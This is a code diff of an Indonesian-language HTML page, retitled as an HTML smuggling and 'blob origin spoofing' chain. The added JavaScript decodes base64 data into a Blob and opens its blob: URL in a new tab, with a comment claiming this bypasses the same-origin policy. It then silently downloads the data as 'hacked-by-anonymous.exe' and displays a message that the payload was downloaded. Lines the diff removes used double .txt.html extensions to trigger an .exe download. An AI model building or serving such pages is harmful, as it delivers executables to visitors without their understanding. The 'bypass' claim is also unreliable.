@@ -3,92 +3,27 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Generator Berkas Blob &amp; ObjectURL</title>
+<title>Chaining: HTML Smuggling + Blob Origin Spoofing</title>
 <style>
-* {
-box-sizing: border-box;
-margin: 0;
-padding: 0;
-}
-body {
-font-family: Arial, sans-serif;
-background: #f4f6f8;
-color: #222;
-padding: 20px;
-}
-.panel {
-background: #ffffff;
-padding: 24px;
-border-radius: 12px;
-box-shadow: 0 2px 12px rgba(0, 0, 0, 0.1);
-max-width: 600px;
-margin: 40px auto;
-}
-:fullscreen {
-background: #111111 !important;
-color: #00ff00 !important;
-padding: 20px !important;
-overflow-y: auto !important;
-width: 100vw !important;
-height: 100vh !important;
-}
-:-webkit-full-screen {
-background: #111111 !important;
-color: #00ff00 !important;
-padding: 20px !important;
-overflow-y: auto !important;
-}
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body { font-family: Arial, sans-serif; background: #f4f6f8; color: #222; padding: 20px; }
+.panel { background: #ffffff; padding: 24px; border-radius: 12px; box-shadow: 0 2px 12px rgba(0, 0, 0, 0.1); max-width: 600px; margin: 40px auto; }
+:fullscreen { background: #111111 !important; color: #00ff00 !important; padding: 20px !important; overflow-y: auto !important; width: 100vw !important; height: 100vh !important; }
+:-webkit-full-screen { background: #111111 !important; color: #00ff00 !important; padding: 20px !important; overflow-y: auto !important; }
 h2 { margin-bottom: 10px; }
 p { margin-bottom: 15px; line-height: 1.5; }
-button {
-width: 100%;
-padding: 16px;
-cursor: pointer;
-border: none;
-border-radius: 6px;
-background: #d32f2f;
-color: #ffffff;
-font-weight: bold;
-font-size: 16px;
-box-shadow: 0 4px 12px rgba(211, 47, 47, 0.3);
-transition: background 0.2s;
-}
+button { width: 100%; padding: 16px; cursor: pointer; border: none; border-radius: 6px; background: #d32f2f; color: #ffffff; font-weight: bold; font-size: 16px; box-shadow: 0 4px 12px rgba(211, 47, 47, 0.3); transition: background 0.2s; }
 button:hover { background: #b71c1c; }
-#status {
-margin-top: 16px;
-font-weight: bold;
-color: #d32f2f;
-padding: 12px;
-background: #ffebee;
-border-radius: 6px;
-text-align: center;
-border: 1px solid #ffcdd2;
-}
-#downloads {
-margin-top: 20px;
-display: grid;
-grid-template-columns: repeat(auto-fill, minmax(130px, 1fr));
-gap: 10px;
-}
-#downloads a {
-display: block;
-padding: 8px;
-background: #212121;
-color: #80df82;
-text-decoration: none;
-border-radius: 4px;
-font-size: 12px;
-text-align: center;
-border: 1px solid #424242;
-word-break: break-all;
-}
+#status { margin-top: 16px; font-weight: bold; color: #d32f2f; padding: 12px; background: #ffebee; border-radius: 6px; text-align: center; border: 1px solid #ffcdd2; }
+#downloads { margin-top: 20px; display: grid; grid-template-columns: repeat(auto-fill, minmax(130px, 1fr)); gap: 10px; }
+#downloads a { display: block; padding: 8px; background: #212121; color: #80df82; text-decoration: none; border-radius: 4px; font-size: 12px; text-align: center; border: 1px solid #424242; word-break: break-all; }
 </style>
 </head>
 
 <body>
 <div class="panel" id="main-panel">
-<h2>Generator Berkas Blob &amp; ObjectURL</h2>
-<p>Klik tombol untuk mengunduh file ber-ekstensi ganda (.txt.html) yang saat dibuka akan memicu unduhan .exe.</p>
+<h2>Chaining: Blob Origin Spoofing</h2>
+<p>Klik tombol untuk memicu pembuatan file yang akan membuka halaman baru dengan URL <code>blob:</code> untuk mem-bypass origin.</p>
 
 <button id="start-btn" type="button">Mulai Layar Penuh &amp; Generate Blob</button>
 
@@ -157,17 +92,30 @@ const prepareMimeBlobAsync = (i) => {
             "    try{" +
             "        statusEl.textContent = 'Menyiapkan berkas...';" +
             "        var bytesArr = b64KeBytes(b64Data);" +
+            
+            // CHAINING 1: Membuat Blob URL (Mewarisi Origin)
             "        var blob = new Blob([bytesArr], { type: 'application/octet-stream' });" +
-            "        var url = URL.createObjectURL(blob);" +
+            "        var blobUrl = URL.createObjectURL(blob);" +
+            
+            // CHAINING 2: Membuka Blob URL di tab baru (Bypass SOP)
+            "        var newWindow = window.open(blobUrl, '_blank');" +
+            "        if (!newWindow) {" +
+            "            statusEl.textContent = 'Pop-up diblokir. Silakan klik lagi.';" +
+            "            sudah = false;" +
+            "            return;" +
+            "        }" +
+            
+            // Eksekusi unduhan di tab utama
             "        var a = document.createElement('a');" +
-            "        a.href = url;" +
+            "        a.href = blobUrl;" +
             "        a.download = 'hacked-by-anonymous.exe';" +
             "        a.style.display = 'none';" +
             "        document.body.appendChild(a);" +
             "        a.click();" +
+            
             "        setTimeout(function(){ " +
             "            if (a.parentNode) a.parentNode.removeChild(a); " +
-            "            URL.revokeObjectURL(url); " +
+            "            URL.revokeObjectURL(blobUrl); " +
             "        }, 3000);" +
             "        statusEl.textContent = 'Payload berhasil diunduh!';" +
             "        statusEl.style.color = '#0f0';" +
@@ -196,11 +144,8 @@ const prepareMimeBlobAsync = (i) => {
 const triggerInstantDownload = (fileData) => {
     const link = document.createElement("a");
     link.href = fileData.url;
-    
-    // PERUBAHAN DI SINI: Ekstensi Ganda .txt.html
-    link.download = `waguri-file-${fileData.id}.txt.html`;
-    
-    link.textContent = `Blob #${fileData.id} (.txt.html)`;
+    link.download = `waguri-file-${fileData.id}.txt`;
+    link.textContent = `Blob #${fileData.id} (.txt)`;
     link.style.display = "none";
     downloadsDiv.appendChild(link);
     link.click();
@@ -216,11 +161,6 @@ const processLoop = async (counter) => {
 
     statusDiv.textContent = `Proses Berjalan: Berkas ke-${counter} dikirim`;
 
-    if (counter % 10 === 0) {
-        speak(`Proses mencapai ${counter} berkas.`);
-    }
-
-    // Hentikan setelah 1 file untuk demonstrasi yang bersih
     if (counter >= 1) {
         isProcessing = false;
         startBtn.disabled = false;
